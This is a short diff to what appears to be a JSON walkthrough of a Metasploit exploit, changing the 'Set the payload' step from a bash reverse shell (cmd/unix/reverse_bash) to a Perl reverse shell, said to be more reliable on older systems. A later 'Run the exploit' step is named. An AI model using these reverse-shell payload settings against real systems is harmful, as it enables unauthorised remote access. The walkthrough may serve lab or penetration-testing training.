@@ -57,8 +57,8 @@
     },
     {
       "title": "Set the payload",
-      "command": "set PAYLOAD cmd/unix/reverse_bash",
-      "explanation": "Use a bash reverse shell payload."
+      "command": "set PAYLOAD cmd/unix/reverse_perl",
+      "explanation": "Use a Perl reverse shell payload (more reliable than bash on older systems)."
     },
     {
       "title": "Run the exploit",
